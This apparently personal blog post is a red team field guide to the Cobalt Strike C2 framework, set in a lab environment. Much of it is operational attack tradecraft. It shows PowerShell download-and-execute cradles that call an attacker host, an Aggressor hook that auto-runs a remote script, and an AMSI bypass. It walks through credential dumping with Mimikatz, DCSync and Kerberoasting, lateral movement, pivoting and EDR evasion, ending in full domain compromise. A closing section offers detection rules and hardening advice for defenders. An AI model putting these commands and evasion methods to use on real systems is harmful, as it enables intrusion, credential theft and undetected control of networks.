title: "Cobalt Strike Deep Dive: Complete Red Team Field Guide"
date: 2026-04-28 00:00:00 +0000
categories: [Red Team, C2]
tags: [cobalt-strike, c2, command-and-control, red-team, post-exploitation, malleable-c2, beacon, pivoting, lateral-movement, evasion, aggressor-scripting]
description: "Comprehensive red team guide to Cobalt Strike — architecture, team server setup, malleable C2 profiles, beacon generation, all listener types, post-exploitation commands, cred dumping, lateral movement, pivoting, Aggressor scripting, detection, and full attack walkthroughs."

toc: true
---

## What Is Cobalt Strike?

Cobalt Strike is a commercial adversary simulation and red team operations framework developed by Fortra (formerly HelpSystems). It is the industry standard for professional red team engagements, widely used by both legitimate security teams and advanced threat actors — including **APT29 (Cozy Bear)**, **FIN7**, **Carbanak**, and countless ransomware affiliates.

Cobalt Strike models post-exploitation actions through **Beacon**, a flexible, stealthy payload that supports a wide range of C2 protocols, in-memory .NET execution, lateral movement, credential theft, and covert pivoting. Its **Malleable C2** feature allows operators to fully customize network indicators, blending into target environments with precision.

**Why Cobalt Strike over Sliver?**

| Feature | Cobalt Strike | Sliver |
|---------|--------------|--------|
| Cost | ~$3,500/year (licensed) | Free / Open Source |
| Language | Java (Aggressor in Sleep) | Go |
| Malleable C2 | Full HTTP/S/DNS customization | Partial profile support (emerging) |
| Transport protocols | HTTP/S, DNS, SMB, TCP, External C2 | mTLS, WireGuard, HTTP/S, DNS |
| BOF support | Native (TrustedSec COFF loader) | Coff-loader extension |
| .NET execution | execute-assembly (native) | execute-assembly (via Donut) |
| Pivoting | SOCKS proxy, reverse port forward, pivot listeners, Covert VPN | SOCKS5, port forward, WireGuard |
| Automation / Scripting | Aggressor Script (Sleep language) | gRPC API, client scripting |
| APT usage | Universal (APT29, FIN7, Black Basta, etc.) | APT29, BumbleBee |
| Maturity | 10+ years, enterprise support | Active open-source, fast-growing |

> **Note:** Cobalt Strike is a licensed tool. Use only on authorized engagements. This guide is for educational purposes, focusing on defender awareness and red team tradecraft.

Lab environment used throughout this blog:

| Role | Value |
|------|-------|
| Attacker / Team Server | Kali Linux — `10.10.14.55` |
| Victim 1 | Windows 10/11 — `10.129.229.224` (user: `eliot`) |
| Victim 2 (pivot target) | Windows Server 2022 DC — `10.129.229.10` (internal) |
| Domain | `inlanefreight.local` |
| Attacker user | `hossam` / `HossamR3dT3am!` |
| Team server password | `StrongPass123!` |

---

## Architecture Overview

```
┌──────────────────────────────────────────────────┐
│              COBALT STRIKE ECOSYSTEM              │
│                                                   │
│  ┌───────────────┐   SSH/SSL    ┌──────────────┐  │
│  │ Cobalt Strike │ ──────────►  │ Team Server  │  │
│  │  Client (GUI) │   TCP 50050  │  (Java)      │  │
│  └───────────────┘              └──────┬───────┘  │
│                                        │           │
│                        C2 Protocols:              │
│               HTTP/S / DNS / SMB / TCP / External │
│                                        │           │
│                                 ┌──────▼──────┐    │
│                                 │   BEACON    │    │
│                                 │ (Payload)   │    │
│                                 │ on victim   │    │
│                                 └─────────────┘    │
└──────────────────────────────────────────────────┘
```

**Key components:**

| Component | Description |
|-----------|-------------|
| **Team Server** | Central C2 server — manages beacons, listeners, logs, and data. Java-based. |
| **Client** | Operator GUI (Java/Swing) — connects to team server via SSL on TCP 50050. |
| **Beacon** | Final payload — executes on victim, communicates via chosen C2 protocol. |
| **Listeners** | Server-side protocol handlers (HTTP/S, DNS, SMB, TCP, External C2). |
| **Malleable C2** | Profile file that customizes every aspect of Beacon's network indicators. |
| **Aggressor Script** | Automation engine using the Sleep scripting language. |

**Beacon modes:**

| Mode | Behavior | Use Case |
|------|----------|----------|
| **Interactive Session** | Real-time command loop | Active operations, SOCKS, pivoting |
| **Beacon (sleep)** | Async check-in intervals + jitter | Long-term access, OPSEC-sensitive ops |

Cobalt Strike calls every connection a "beacon," but internally it can operate in interactive mode when you type commands directly, or asynchronously with sleep intervals.

---

## Installation & Team Server Setup

Cobalt Strike requires a valid license key (`cobaltstrike.auth` file). Download the latest tarball from the licensed portal.

### Basic Installation (Linux)

```bash
# Install Java 11+ and dependencies
root@root$ sudo apt update && sudo apt install openjdk-17-jdk -y
# Download and extract
root@root$ tar -xzf cobaltstrike-dist.tgz
root@root$ cd cobaltstrike

# Place the license key in the folder
root@root$ cp ~/cobaltstrike.auth .

# Ensure the teamserver script is executable
root@root$ chmod +x teamserver
```

### Starting the Team Server

```bash
# Syntax: ./teamserver <IP> <password> [/path/to/malleable.profile] [killdate]
root@root$ sudo ./teamserver 10.10.14.55 StrongPass123! \
    /opt/profiles/amazon.profile \
    2026-12-31

[*] Team server is up on 10.10.14.55
[*] SHA256 hash of SSL cert is <...>
```

The team server listens on port `50050` for client connections. The profile file defines the C2 configuration for HTTP/S payloads (Malleable C2). Without a profile, it uses a generic profile that is easily signatured.

### Connecting via Client

```bash
# Launch the client (GUI) on attacker workstation
root@root$ ./cobaltstrike

# Connect: enter IP 10.10.14.55, port 50050, password StrongPass123!
```

Multiplayer mode is built-in: multiple clients can connect to the same team server, share data, and interact with beacons simultaneously. Operators can use separate nicknames.

---

## Listeners (C2 Protocols)

Before generating a payload, you must create at least one **listener**. Cobalt Strike supports a variety of protocols.

### HTTP / HTTPS Listener

```
# Via GUI: Cobalt Strike -> Listeners -> Add
#   Name: http-listener
#   Payload: Beacon HTTP
#   HTTP Hosts: 10.10.14.55
#   Port (C2): 80
#   HTTP Host Header: updates.microsoft-cdn.net (optional)
#   Profile: amazon.profile
```

HTTPS is identical but binds on port 443 and uses TLS with the team server's self-signed certificate (or a custom one via LetsEncrypt). The Malleable C2 profile defines the exact URI paths, user-agent, and server responses.

**Command line (Aggressor):**
```aggressor
listener_create("https-listener", "windows/beacon_https/reverse_https", 
    "10.10.14.55", 443, "amazon.profile");
```

### DNS Listener

DNS tunneling uses TXT, A, or AAAA records to communicate. You need a domain with an NS record pointing to the team server.

```
# Listener config:
#   Name: dns-listener
#   Payload: Beacon DNS
#   DNS Hosts: c2.inlanefreight.local
#   Port (C2): 53 (UDP)
#   DNS type: Txt (default)
```

Beacons encode data in Base64/Base32 DNS queries. Sleep intervals are critical to control the noise.

### SMB Listener (Pivoting)

SMB Beacon uses named pipes over SMB for peer-to-peer C2. It requires an existing TCP beacon as the parent.

```
# Create SMB listener:
#   Name: smb-pivot
#   Payload: Beacon SMB
#   Pipe name: mypipedevice  (customizable)
```

After creating the SMB listener, you can link an SMB beacon to the parent via `link <IP>` command on the primary beacon.

### TCP Listener (Pivoting)

TCP Beacon is a simple raw TCP reverse connection, useful in pivoting scenarios. Not encrypted unless layered.

```
# Listener: Beacon TCP
#   Port: 4444
#   Bind to: 0.0.0.0
```

### External C2 (Third-Party Chaining)

External C2 allows you to bridge traffic from any other C2 framework into Cobalt Strike. The team server exposes a gRPC API for this.

### Foreign Listener

A Foreign Listener sends a reference to a payload already generated by another framework (like an Empire/Metasploit agent), allowing Cobalt Strike to manage it.

---

## Beacon Payload Generation

Beacon payloads are generated under **Attacks -> Packages**.

### Payload Types

| Type | Description | Use Case |
|------|-------------|----------|
| **Windows Executable** | Stageless EXE | Direct execution, USB drops |
| **Windows Executable (S)** | Staged EXE (tiny) | Small dropper, downloads full beacon |
| **PowerShell** | Base64-encoded PowerShell one-liner | Phishing, in-memory execution |
| **PowerShell (S)** | Staged PowerShell | Fileless, uses shellcode runner |
| **Python** | Cross-platform Python script | Linux/Mac initial access |
| **Raw** (Stageless) | Shellcode blob (.bin) | Custom loaders, process injection |
| **DLL** (Stageless) | Reflective DLL for `rundll32` or injection | Userland persistence |
| **Svc-EXE** | Stageless service binary | Lateral movement via PsExec |

### Stageless vs. Staged

- **Stageless**: Contains full beacon logic. Larger (100–300KB), simpler, no external download.  
- **Staged**: Tiny stager (~1–2KB) downloads the full beacon from the listener. Better for OPSEC (small payload, evades signature-based detection), but requires the listener to be accessible.

Example: Staged HTTP beacon:
```
Attacks -> Packages -> Windows Executable (S)
Listener: http-listener
Output: RAW (shellcode) or EXE
```

### Generate via Scripts

```aggressor
# Generate stageless raw shellcode for custom loader
$payload = artifact_payload("http-listener", "raw", "x64");
```

### PowerShell One-Liner

```
# Cobalt Strike -> Attacks -> Scripted Web Delivery (S)
# Generates a PowerShell command that downloads the stager from a hosted script
```

The generated command:

```powershell
powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.14.55/a'))"
```

The `/a` URI is also defined in the Malleable C2 profile.

---

## Malleable C2 Profiles

Malleable C2 profiles are **the heart of Cobalt Strike evasion**. They control:

- HTTP request/response headers, URIs, parameter names
- Beacon sleep patterns, jitter, user-agent
- Client-side TLS certificate authentication
- DNS TLDs, query types, subdomain encoding
- Process injection techniques (spawn, fork&run)
- Post-exploitation job architecture (fork, run, inline)
- SMTP exfiltration (not covered here)

### Profile Structure

A profile is a text file with high-level directives and optional raw HTTP stubs.

```text
# amazon.profile (excerpt)
set sleeptime "5000";
set jitter "20";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

http-get {
    set uri "/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=";
    client {
        header "Host" "www.amazon.com";
        metadata {
            base64url;
            prepend "kwd=";
            header "Cookie";
        }
    }
    server {
        header "Server" "Server";
        output {
            base64url;
            print;
        }
    }
}

http-post {
    set uri "/N/18163/";
    client {
        header "Content-Type" "application/x-www-form-urlencoded";
        id {
            parameter "id";
        }
        output {
            base64url;
            print;
        }
    }
    server {
        output {
            base64url;
            print;
        }
    }
}
```

### Customizing Profiles

- **sleeptime / jitter**: Controls beacon check-in. Reduce jitter for low latency, increase for stealth.
- **useragent**: Match the target organization’s browsers.
- **http-get / http-post**: Define the heartbeat and command/data exfiltration channels. At minimum, define the URI, client headers, metadata encoding, and server output encoding.
- **metadata**: Encoded beacon metadata (hostname, user, architecture) sent on each GET.
- **id**: Parameter used for tasking beacon.
- **process-inject**: Define how `execute-assembly` or `inject` spawns processes.

### Profile Validation and Testing

```bash
# Validate profile syntax
root@root$ ./c2lint /opt/profiles/custom.profile
[*] No syntax errors found.
```

### Hosting the Profile

When starting the team server, pass the profile file:

```bash
sudo ./teamserver 10.10.14.55 StrongPass123! custom.profile
```

### HTTP Stager Configuration

If using staged payloads, you may define `http-stager` block to host the stager shellcode:

```text
http-stager {
    set uri_x86 "/robots.txt";
    set uri_x64 "/favicon.ico";
    server {
        header "Content-Type" "application/octet-stream";
    }
}
```

---

## Receiving and Interacting with Beacons

### Deliver the Payload

After generating an EXE or PowerShell stager via `Attacks -> Packages`, you can host it:

```bash
# Host via HTTP (team server itself hosts the payload if using scripted web delivery)
# Or manually:
root@root$ cd /opt/payloads
root@root$ python3 -m http.server 8080
```

On the victim, execute:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.55:8080/a')
```

### Beacon Callback

In the Cobalt Strike GUI, a new entry appears in the **Event Log**:

```
[*] initial beacon from 10.129.229.224 (DESKTOP-WIN11) - 10.129.229.224
```

The beacon appears in the table; right-click -> **Interact** to open tab.

```
beacon> help
```

### Core Post-Exploitation Commands

| Command | Description |
|---------|-------------|
| `shell <cmd>` | Run cmd.exe command |
| `powerpick <cmd>` | Run PowerShell without powershell.exe (uses unmanaged powershell) |
| `powershell <cmd>` | Run PowerShell via powershell.exe (more detectable) |
| `powershell-import /path/script.ps1` | Load script into session, call functions with `powershell` |
| `execute-assembly /opt/tool.exe` | In-memory .NET execution |
| `run <command>` | Execute program (creates process) |
| `upload /path/local C:\Windows\Temp\file` | Upload file |
| `download C:\file.txt` | Download file |
| `downloads` | List/downloaded files |
| `ls`, `cd`, `pwd` | File system navigation |
| `ps` | Process list |
| `help` | Full command list |
| `getuid`, `getprivs` | User, privileges |
| `steal_token <PID>` | Impersonate process token |
| `rev2self` | Revert token |
| `getsytem` | Elevate to SYSTEM (attempt various methods) |
| `mimikatz !sekurlsa::logonpasswords` | Dump credentials |
| `logonpasswords` | Built-in shortcut to Mimikatz logonpasswords |
| `hashdump` | Dump SAM hashes |
| `dcsync <domain> <user>` | DCSync attack (needs Domain Admin privs) |
| `psexec <target> <listener>` | Lateral movement |
| `wmi <target> <listener>` | WMI lateral movement |
| `portscan <target> <port>` | Simple TCP port scan |
| `socks <port>` | Start SOCKS proxy |
| `rportfwd <listen_port> <target> <target_port>` | Reverse port forward |
| `spawn <listener>` | Spawn new beacon in a new process |
| `inject <PID> <listener>` | Inject beacon into process |
| `shinject <PID> /path/shellcode.bin` | Inject arbitrary shellcode |
| `keylogger` | Start keylogger |
| `screenshot` | Take screenshot |
| `sleep <seconds> <jitter>` | Update beacon sleep settings |

---

## Scenario 1: Initial Access → SYSTEM

**Goal:** From domain user `eliot` to SYSTEM on `DESKTOP-WIN11`.

### Step 1: Deploy staged payload

Generate a PowerShell stager (HTTP listener) and execute on the victim. Beacon checks in.

```
beacon> getuid
[*] INLANEFREIGHT\eliot
beacon> getprivs
...
SeChangeNotifyPrivilege
```

### Step 2: Elevate to SYSTEM

```
beacon> getsystem
[+] got system via service (pipe) on DESKTOP-WIN11
[*] Tasked beacon to spawn windows/beacon_http/reverse_http (10.10.14.55)
[+] host called home, sent: 12 bytes
```

If `getsystem` fails, use `elevate` with UAC bypass techniques:

```
beacon> elevate uac-token-duplication http-listener
```

Or inject into a SYSTEM process:

```
beacon> ps
...
  628  492  lsass.exe    x64   NT AUTHORITY\SYSTEM
beacon> steal_token 628
[+] Impersonated NT AUTHORITY\SYSTEM
beacon> spawn http-listener
[+] new beacon spawned
beacon> rev2self
```

### Step 3: Migrate to a safer process

```
beacon> inject 628 x64 http-listener
[+] new beacon created in PID 628
```

---

## Credential Dumping

Cobalt Strike integrates Mimikatz deeply.

### Method 1: `logonpasswords`

```
beacon> logonpasswords
Authentication Id : 0 ; 1234567
Session           : Interactive from 1
User Name         : eliot
Domain            : INLANEFREIGHT
         * Username : eliot
         * Domain   : INLANEFREIGHT.LOCAL
         * Password : Password123!
```

### Method 2: DCSync (if Domain Admin)

```
beacon> dcsync INLANEFREIGHT Administrator
[+] DCSync succeeded
INLANEFREIGHT\Administrator:501:aad3b...:ef7e3f...
```

### Method 3: Hashdump

```
beacon> hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
eliot:1001:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
```

### Method 4: Kerberoasting (via `rubeus` alias)

```
beacon> execute-assembly /opt/Rubeus.exe kerberoast /format:hashcat /nowrap
[*] Total kerberoastable users : 3
...
$krb5tgs$23$*MSSQLSvc$...
```

Crack offline:

```bash
root@root$ hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt
```

### Method 5: Safely dump LSASS with `procdump` / Mimikatz

```
beacon> run mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
```

Or avoid touching disk with `execute-assembly` and a .NET Mimikatz like `SafetyKatz`.

---

## Lateral Movement

### psexec (Built-in)

```
beacon> psexec DC01 smb-pivot
[+] established beacon on DC01 (SMB)
```

Requires a corresponding SMB listener. The command uploads the SMB beacon service binary via ADMIN$ and starts it.

### psexec_psh (PowerShell one-liner)

```
beacon> psexec_psh DC01 http-listener
```

### wmi and winrm

```
beacon> wmi DC01 http-listener
# or
beacon> winrm DC01 http-listener
```

These spawn remote processes using WMI or WinRM.

### Using SOCKS Proxy for Impacket Tools

Start a SOCKS proxy on the beacon and configure proxychains:

```
beacon> socks 1080
[*] SOCKS proxy started on port 1080
```

Attacker machine:

```bash
root@root$ proxychains4 crackmapexec smb 10.129.229.10 -u Administrator -p 'Admin@123!' --local-auth
root@root$ proxychains4 impacket-secretsdump 'inlanefreight.local/Administrator:Admin@123!@10.129.229.10'
```

### Pivot with TCP Beacon

Create a TCP listener on port 4444, then generate a TCP beacon. Upload and execute on the pivot host:

```
beacon> upload /tmp/tcp_beacon.exe
beacon> shell C:\Windows\tcp_beacon.exe
```

The TCP beacon connects back to the parent beacon's team server via the established SMB/TCP tunnel.

---

## Scenario 2: Full Domain Compromise

1. **Initial access** via phishing with PowerShell stager.
2. **Enumeration**: `net users /domain`, `net group "Domain Admins" /domain`. Use `SharpHound` via `execute-assembly`.
3. **SharpHound**:
   ```
   beacon> execute-assembly /opt/SharpHound.exe -c All --zipfilename bh.zip
   beacon> download C:\Windows\Temp\bh_*.zip
   ```
   Import into BloodHound.
4. **Privilege Escalation**: `getsystem` or UAC bypass.
5. **Credential Dump**: `logonpasswords` → find Domain Admin credentials.
6. **Lateral Movement**: `psexec DC01 http-listener`.
7. **DCSync** on DC to get krbtgt hash.
8. **Golden Ticket**: Use `mimikatz` or `Rubeus` to craft a ticket.
9. **Persist** via SMB beacon, scheduled task, or WMI event subscription.

---

## Pivoting & Network Tunnelling

### SOCKS Proxy

```
beacon> socks 1080
```
The team server opens a SOCKS4/5 proxy, forwarding traffic through the beacon.

### Reverse Port Forward

```
beacon> rportfwd 8080 10.129.229.10 80
[*] Reverse port forward on 8080 to 10.129.229.10:80
```
Now `http://teamserver:8080` reaches the internal web server through the beacon.

### Covert VPN

Cobalt Strike can deploy a **Covert VPN** client to pivot full Layer-3 access. Requires a VPN service (OpenVPN) on the team server or another redirector. Setup is complex and used for full internal network access without proxychains.

### Pivot Listeners

Instead of tunneling traffic, you can spawn new beacons on compromised hosts using SMB/TCP listeners, effectively extending your C2 footprint deeper into the network.

---

## Aggressor Scripting (Automation)

Aggressor is the scripting engine using the **Sleep** language. It allows you to automate tasks, extend GUI menus, process events.

### Basic Example: Auto-Recon on New Beacon

Create `autorun.cna`:

```aggressor
on beacon_initial {
    # When a new beacon arrives, automatically:
    binput($1, "getuid");
    bshell($1, "whoami /all");
    bpsinject($1, "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.55/recon.ps1')");
    blog2($1, "Initial recon started");
}
```

Load via **Cobalt Strike -> Script Manager -> Load**.

### Custom Menu Item

```aggressor
popup beacon_bottom {
    menu "&Custom Actions" {
        item "&Dump Hashes" {
            bhashdump($1);
        }
        item "&Run SharpHound" {
            bexecute_assembly($1, "/opt/SharpHound.exe", "-c All");
        }
    }
}
```

### Integration with External Tools

Aggressor can call system commands:

```aggressor
sub run_impacket_secretsdump {
    exec("proxychains4 impacket-secretsdump $target");
}
```

Aggressor provides hooks for every event: beacon check-in, output, errors, keyboard activity, etc. This is essential for operational efficiency.

---

## Evasion & OPSEC

### Malleable C2 - The Ultimate Customization

A well-crafted profile can mimic legitimate traffic (e.g., Amazon, Microsoft CDN, Azure, Google APIs). Profile matches should include:

- Legitimate domain fronting (if allowed)
- Realistic user-agent strings
- Cookie names, parameter names
- Jitter and sleep variation
- Use of `pipename` for SMB (e.g., `\\.\pipe\svcctl` can look like a common service pipe)
- DNS profiles mimicking legitimate CDN domains

### Process Injection Options

Define in your profile:

```text
process-inject {
    # Use fork&run or direct injection?
    set allocator "VirtualAllocEx";
    set min_alloc "4096";
    set startrwx "false";
}
```

The `blockdlls` option prevents non-Microsoft DLLs from loading into injected processes, breaking some EDR userland hooks.

### AMSI & ETW Bypass

Cobalt Strike's `execute-assembly` can be paired with AMSI bypass patches. Aggressor scripts often patch AMSI before running .NET tools:

```aggressor
# Patch AMSI in the current process (beacon)
bpowershell_import($1, script_resource("amsi_bypass.ps1"));
bpowerpick($1, "ReflectiveLoader -Path C:\\Windows\\Temp\\SafetyKatz.exe");
```

### Sleep Mask / Sleep Obfuscation

The Malleable C2 `sleep_mask` parameter instructs Beacon to obfuscate itself in memory while sleeping (by XOR’ing copy). This evades memory scanners that hunt for clear-text payloads.

```text
set sleep_mask "true";
```

### Artifact Kit

Cobalt Strike comes with an **Artifact Kit**—source code templates for generating EXE/DLL payloads. You can modify:

- The resource section in the stub
- String encryption
- Anti-sandboxing (e.g., check CPU cores before connecting)
- Alternative shellcode loaders

Recompile with Visual Studio, place in `artifacts` folder, and reference in `artifact` crate.

### Stageless Payloads and Redirectors

Use HTTPS redirectors (Apache/Nginx reverse proxy) in front of the team server. This masks the real C2 IP, helps with domain fronting/ categorization, and adds a layer of indirection.

### User-Agent Randomization

Randomize or rotate user-agents from a predefined list in the profile:

```text
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
```

---

## Detection: Blue Team Perspective

Cobalt Strike is heavily signatured. Default profiles generate predictable JA3/JARM fingerprints, static binary artifacts, and identifiable URI patterns. Adversaries customize these, but many threat actors misconfigure or use stolen old profiles.

### Default Network Indicators (Known Bad)

| Protocol | Indicator | Description |
|----------|-----------|-------------|
| HTTP/S | URI path `"/jquery-3.3.1.min.js"` or `"/jquery"` | Default profile |
| HTTP/S | URI path `"/__init__.js"` | Old common profiles |
| HTTP/S | Base64-encoded cookie with length multiple of 4 | Metadata cookie |
| SSL/TLS | JARM hash `07d14d16d21d21d07c42d41d0003ed3eef6eaa8ea627b92876a8f1c44e72f9` | Default Cobalt Strike team server |
| DNS | High entropy subdomains, repeated TXT queries | DNS C2 |
| SMB | Named pipe default `"msagent_%d"` | Easily changeable |
| TCP | Raw TCP beacon on port 4444 | Default profile |

### Sysmon Detection Rules

**Rule 1 — Cobalt Strike Process Injection (fork & run)**

```yaml
title: Cobalt Strike Spawns Sacrificial Process (RunDLL, WerFault)
id: 5a7e3b5e-1a2b-4c3d-8e9f-0a1b2c3d4e5f
status: experimental
tags:
  - attack.defense_evasion
  - attack.t1055
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\rundll32.exe'
    Image|endswith: '\WerFault.exe'
    CommandLine|contains: '-k'
  condition: selection
level: high
```

**Rule 2 — Cobalt Strike SMB Named Pipe**

```yaml
title: Cobalt Strike SMB Named Pipe Access
id: 6b8f4c9e-2a3b-4d5c-8e9f-0a1b2c3d4e5g
status: experimental
tags:
  - attack.lateral_movement
  - attack.t1021.002
logsource:
  category: pipe_created
  product: windows
detection:
  selection:
    PipeName|contains: 'msagent_'
  condition: selection
level: high
```

### Splunk Queries

**Query 1 — Default Cobalt Strike URIs**

```spl
index=proxy sourcetype=squid OR sourcetype=bluecoat
uri_path IN ("/jquery-3.3.1.min.js", "/__init__.js", "/submit.php")
| stats count by src_ip, uri_path, dest
| sort -count
```

**Query 2 — High Entropy DNS Subdomains**

```spl
index=dns
| eval subdomain=mvindex(split(domain, "."), 0)
| eval entropy=len(subdomain)
| where entropy > 40 AND query_type="TXT"
| stats count by src_ip, domain
| where count > 5
```

**Query 3 — Suspicious PowerShell Downloads**

```spl
index=windows SourceName="Microsoft-Windows-Sysmon" EventCode=1
Image="*\\powershell.exe" CommandLine="*downloadstring*" OR CommandLine="*webclient*"
| table _time, ComputerName, User, CommandLine
```

**Query 4 — LSASS Access by Non-Microsoft Process**

```spl
index=windows source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=10
TargetImage="*\\lsass.exe"
SourceImage!="*\\MsMpEng.exe" SourceImage!="*\\csrss.exe" SourceImage!="*\\wininit.exe"
| stats count by _time, ComputerName, SourceImage, User
```

---

## MITRE ATT&CK Mapping

| Tactic | ID | Technique | Cobalt Strike Feature |
|--------|----|-----------|-----------------------|
| Execution | T1059.001 | PowerShell | `powershell`, `powerpick`, scripted web delivery |
| Execution | T1059.003 | Windows Command Shell | `shell`, `psexec` |
| Execution | T1047 | WMI | `wmi` |
| Persistence | T1543.003 | Windows Service | psexec service, SMB beacon |
| Persistence | T1053.005 | Scheduled Task | `schtasks` via shell |
| Privilege Escalation | T1134.001 | Token Impersonation | `steal_token`, `getsystem` |
| Privilege Escalation | T1548.002 | UAC Bypass | `elevate uac-token-duplication` |
| Defense Evasion | T1055 | Process Injection | `inject`, `shinject`, `spawn`, `execute-assembly` |
| Defense Evasion | T1027 | Obfuscated Files | Malleable C2, Artifact Kit, sleep mask |
| Defense Evasion | T1562.001 | Disable/Modify Tools | Aggressor-loaded AMSI bypass, `powerpick` |
| Credential Access | T1003.001 | LSASS Memory | `logonpasswords`, Mimikatz |
| Credential Access | T1003.002 | SAM | `hashdump` |
| Credential Access | T1003.006 | DCSync | `dcsync` |
| Credential Access | T1558.003 | Kerberoasting | `execute-assembly` with Rubeus |
| Discovery | T1082 | System Info | `shell systeminfo` |
| Discovery | T1069.002 | Domain Groups | `net group "Domain Admins" /domain` |
| Lateral Movement | T1021.002 | SMB/Admin Shares | `psexec`, `psexec_psh` |
| Lateral Movement | T1021.006 | WinRM | `winrm` |
| Lateral Movement | T1047 | WMI | `wmi` |
| Command and Control | T1071.001 | Web Protocols | HTTP/S listener, Malleable C2 |
| Command and Control | T1071.004 | DNS | DNS listener |
| Command and Control | T1090 | Proxy | SOCKS proxy, reverse port forward |
| Exfiltration | T1041 | C2 Channel | `download` command |

---

## Hardening Against Cobalt Strike

| Control | Mitigation |
|---------|-----------|
| **Network Segmentation** | Block outbound to non-whitelisted ports; restrict DNS to internal resolvers; block default C2 ports (80,443,53 over non-standard hosts). |
| **JA3/JARM Fingerprinting** | Deploy network detection signatures for known Cobalt Strike TLS fingerprints. Blacklist default JARM hashes. |
| **Proxy Filtering** | Inspect HTTP traffic for Beacon’s metadata patterns (large base64 cookies, abnormal URI paths). |
| **EDR & AMSI** | Enable script block logging, AMSI, and process creation auditing (Sysmon). Harden LSASS (PPL). |
| **AppLocker / WDAC** | Restrict executables from `%TEMP%`, `%APPDATA%`, and user-writable folders. |
| **PowerShell Constrained Language** | Enforce Constrained Language mode to block `IEX`, `Invoke-Expression`. |
| **Credential Guard** | Protect derived domain credentials. |
| **Admin Tiering** | Limit Domain Admin logons to domain controllers only (prevents credential harvesting). |
| **Threat Hunting** | Regularly hunt for large Go/Java binaries in temp paths, unusual named pipes, process hollowing, and scheduled tasks with obscure names. |
| **Network NDR** | Deploy Zeek/Suricata with Cobalt Strike detection signatures (ET OPEN rules). |

---

## Command Cheatsheet

### Listeners

```
# GUI: Cobalt Strike -> Listeners -> Add
listener_create("name", "windows/beacon_http/reverse_http", "10.10.14.55", 80, "profile.profile");
listener_create("dns", "windows/beacon_dns/reverse_dns_txt", "c2.domain.com", 53);
listener_create("smb-pivot", "windows/beacon_smb/bind_pipe", "", 0);
```

### Beacon Commands

```
help                                 # Show all commands
sleep 10 20                          # Set sleep 10s, jitter 20%
getuid                               # Current user
getsystem                            # Elevate to SYSTEM
logonpasswords                       # Dump creds via Mimikatz
hashdump                             # Dump SAM
dcsync INLANEFREIGHT Administrator
execute-assembly /opt/tool.exe       # In-memory .NET
ps                                   # Process list
steal_token <PID>                    # Impersonate
inject <PID> <listener>              # Inject beacon
shinject <PID> /tmp/shellcode.bin    # Inject shellcode
shell whoami
powerpick Get-ADUser -Filter *
powershell-import /scripts/PowerView.ps1
upload /path C:\Users\Public
download C:\Users\eliot\secret.txt
socks 1080                           # SOCKS proxy
rportfwd 8080 10.129.229.10 80      # Reverse port forward
portscan 10.129.229.0/24 445
psexec DC01 smb-pivot
winrm DC01 http-listener
spawn http-listener                  # Spawn new beacon in new process
keylogger
screenshot
```

### Aggressor Automation

```aggressor
on beacon_initial {
    blog2($1, "New beacon: " . beacon_info($1, "user"));
    binput($1, "getuid");
}

popup beacon {
    menu "&Run SharpHound" {
        bexecute_assembly($1, "/opt/SharpHound.exe", "-c All");
    }
}
```

---

## Summary

Cobalt Strike remains the de facto red team C2 framework due to its extreme customizability via Malleable C2, mature post-exploitation features, deep pivoting capabilities, and Aggressor scripting engine. While commercial and closed-source, its widespread use (both legitimate and malicious) makes understanding it essential for both red and blue teams.

From the immediate shell after initial compromise to full domain dominance, Cobalt Strike’s Beacon acts as the Swiss-army knife of post-exploitation — integrating credential dumping, lateral movement, in-memory .NET execution, and covert tunnels in a single, extensible platform.

Defenders must look beyond default signatures and adopt a behavior-based, threat-informed detection strategy. For red teamers, the art lies in custom profile creation, OPSEC-safe operations, and smart pivoting — turning Cobalt Strike into a ghost in the network.

---

*Blog by Hossam Ayman Saeed (Hossam Shady) — Security Engineer / Red Teamer*  
*Instructor @ EC-Council | CRTP | CRTA | CPTS | eCPPT | eWAPT | eJPT | HTB ProLabs*
